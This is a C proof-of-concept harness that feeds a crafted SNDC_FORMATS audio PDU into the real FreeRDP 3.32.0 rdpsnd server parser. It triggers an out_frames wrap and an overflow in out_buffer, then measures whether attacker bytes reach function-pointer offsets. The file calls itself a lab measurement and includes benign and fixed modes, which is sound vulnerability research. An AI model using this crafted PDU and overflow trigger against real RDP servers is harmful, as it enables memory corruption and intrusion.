/*
 * PocWireByteRange.c — wake 21: can attacker wire bytes reach the W20 call
 * target in the rdpsnd out_buffer? (operator DM #5495, standing #8)
 *
 * Drives the REAL 3.32.0 rdpsnd_server_recv_formats() parser with a crafted
 * SNDC_FORMATS PDU. The malicious ADPCM record carries the only client-
 * supplied byte array in the PDU: a cbSize=256 extension filled with 0x5A.
 * SelectFormat() then wraps out_frames, and SendSamples() copies a separate
 * server-capture stand-in (0xDE) into out_buffer. The PoC measures where the
 * wire bytes actually land versus the W20 field offsets (custom at
 * out_buffer+8992, context at +9000 for N=0).
 *
 * This is a LAB MEASUREMENT of byte provenance, not a live session and not an
 * RCE claim. No server-side buffer is patched with the call target: the only
 * client-controlled bytes are the PDU extension. Default posture post-auth.
 *
 * Modes (argv[1]): vuln (default), benign (one PCM record, no wrap),
 * nocall (vuln with custom/context zeroed in the capture buffer),
 * fixed (scratch rdpsnd_main.c with the upstream-style
 *        `nBlockAlign / 7 < nChannels` guard; no wrap).
 */
#include <freerdp/codec/audio.h>
#include <winpr/stream.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef RDPSND_MAIN_SRC
#define RDPSND_MAIN_SRC "rdpsnd_main.c"
#endif

#define WIRE_MARK 0x5Au
#define CAPTURE_MARK 0xDEu
#define EXT_LEN 256u
#define CALL_BYTES 16384u
#define WLOG_BASE 8880u
#define CUSTOM_OFF (WLOG_BASE + 112u)
#define CONTEXT_OFF (WLOG_BASE + 120u)

static BYTE wire_ext[EXT_LEN];
static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
static AUDIO_FORMAT fmt_adpcm = { WAVE_FORMAT_ADPCM, 2, 44100, 176400, 8, 16, EXT_LEN, wire_ext };

/* Real 3.32.0 server source: static parser, select_format, send_samples. */
#include RDPSND_MAIN_SRC

static volatile BYTE* g_out;

int main(int argc, char** argv)
{
	const char* mode = (argc > 1) ? argv[1] : "vuln";
	const int benign = !strcmp(mode, "benign");
	const int nocall = !strcmp(mode, "nocall");
	const int wrap_expected = !benign && strcmp(mode, "fixed");
	const size_t nframes = wrap_expected ? 4096u : 100u;
	BYTE pdu[1024];
	BYTE* capture;
	wStream* s = Stream_New(pdu, sizeof pdu);
	RdpsndServerContext* ctx;
	UINT rc, rc2;
	size_t i, n_wire = 0, n_capture = 0, lo, hi;
	ptrdiff_t blob_delta;
	int wire_at_target;

	setvbuf(stdout, NULL, _IONBF, 0);
	memset(wire_ext, WIRE_MARK, sizeof wire_ext); /* only client byte array */

	/* SNDC_FORMATS header + one or two audio format records. */
	Stream_Write_UINT32(s, 0);
	Stream_Write_UINT32(s, 0xffffffff);
	Stream_Write_UINT32(s, 0);
	Stream_Write_UINT16(s, 0);
	Stream_Write_UINT16(s, benign ? 1 : 2);
	Stream_Write_UINT8(s, 0);
	Stream_Write_UINT16(s, 1); /* wVersion=1 (live-ASan precondition) */
	Stream_Write_UINT8(s, 0);
	audio_format_write(s, &fmt_pcm);
	if (!benign)
		audio_format_write(s, &fmt_adpcm);
	Stream_SetPosition(s, 0);

	ctx = rdpsnd_server_context_new(NULL);
	ctx->src_format = &fmt_pcm;
	ctx->latency = 50;
	InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

	rc = rdpsnd_server_recv_formats(ctx, s);
	printf("[%s] recv_formats rc=%u nformats=%u\n", mode, rc, ctx->num_client_formats);
	if (rc != 0 || ctx->num_client_formats < 1)
		return 2;
	if (!benign)
	{
		const AUDIO_FORMAT* f = &ctx->client_formats[1];
		printf("[%s] wire record: tag=%u ch=%u align=%u cbsize=%u data[0]=%02x data[%u]=%02x\n",
		       mode, f->wFormatTag, f->nChannels, f->nBlockAlign, f->cbSize, f->data[0],
		       f->cbSize - 1, f->data[f->cbSize - 1]);
	}

	ctx->SelectFormat(ctx, 0); /* benign PCM: allocates 8820 bytes */
	rc2 = ctx->SelectFormat(ctx, benign ? 0 : 1);
	g_out = (volatile BYTE*)ctx->priv->out_buffer;
	printf("[%s] SelectFormat rc=%u out_frames=0x%016zx out_buffer_size=%zu\n", mode, rc2,
	       ctx->priv->out_frames, ctx->priv->out_buffer_size);

	/* Byte provenance: the wire blob is a SEPARATE allocation from out_buffer. */
	if (!benign)
	{
		blob_delta = (BYTE*)ctx->client_formats[1].data - (BYTE*)ctx->priv->out_buffer;
		printf("[%s] wire_blob-out_buffer delta=%td bytes (separate allocation)\n", mode,
		       blob_delta);
	}

	/* Server-side capture stand-in. No call target is taken from the wire. */
	capture = (BYTE*)malloc(CALL_BYTES);
	memset(capture, CAPTURE_MARK, CALL_BYTES);
	if (nocall)
	{
		memset(capture + CUSTOM_OFF, 0, 8);
		memset(capture + CONTEXT_OFF, 0, 8);
	}
	ctx->SendSamples(ctx, capture, nframes, 0);

	/* W20 field offsets need the call target to be server-capture bytes. */
	if (wrap_expected)
	{
		const size_t offs[] = { WLOG_BASE, WLOG_BASE + 8, WLOG_BASE + 40, WLOG_BASE + 48,
			                CUSTOM_OFF, CONTEXT_OFF, 12000u };
		printf("[%s] W20 fields in out_buffer:", mode);
		for (i = 0; i < sizeof offs / sizeof offs[0]; i++)
			printf(" %zu=%02x", offs[i], g_out[offs[i]]);
		printf(" (want 5a if wire supplied them; de = capture)\n");
	}

	/* Count wire-marker and capture-marker bytes in the touched window. */
	lo = wrap_expected ? 8820u : 0u;
	hi = wrap_expected ? (8820u + CALL_BYTES) : (nframes * 4u);
	for (i = lo; i < hi; i++)
	{
		if (g_out[i] == WIRE_MARK)
			n_wire++;
		if (g_out[i] == CAPTURE_MARK)
			n_capture++;
	}
	printf("[%s] window [%zu,%zu): wire_0x5a=%zu capture_0xde=%zu\n", mode, lo, hi, n_wire,
	       n_capture);

	wire_at_target = wrap_expected && (g_out[CUSTOM_OFF] == WIRE_MARK ||
	                                   g_out[CONTEXT_OFF] == WIRE_MARK ||
	                                   g_out[CONTEXT_OFF + 1] == WIRE_MARK);
	printf("[%s] RESULT=%s wire_at_call_target=%d\n", mode,
	       wrap_expected ? (wire_at_target ? "WIRE_REACHED" : "WIRE_EXCLUDED") : "NO_WRAP",
	       wire_at_target);
	fflush(stdout);
	_exit(0);
}
